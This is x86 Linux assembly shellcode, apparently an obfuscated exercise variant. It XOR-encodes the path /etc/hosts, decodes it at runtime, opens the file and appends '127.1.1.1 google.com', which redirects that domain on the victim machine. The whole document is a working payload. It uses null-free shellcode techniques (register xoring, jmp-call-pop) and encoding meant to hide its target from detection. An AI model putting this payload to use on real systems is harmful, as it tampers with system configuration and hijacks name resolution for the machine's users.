global _start

section .text

_start:
    xor ecx,ecx
    xor eax,eax
    xor ebx,ebx

    push ecx
    push 0xd9ded9c5     ;/etc///hosts xored with 0xaaaaaaaa
    push 0xc2858585
    push 0xc9decf85
    mov ebx, esp
    mov edx, esp
    mov cl,0x3

xor_decoder:
    mov eax,dword [edx]
    xor eax,0xaaaaaaaa
    mov dword [edx],eax
    add edx,0x4
    loop xor_decoder

    mov cx, 0x401       ;permmisions
    xor eax,eax
    mov al,0x5
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
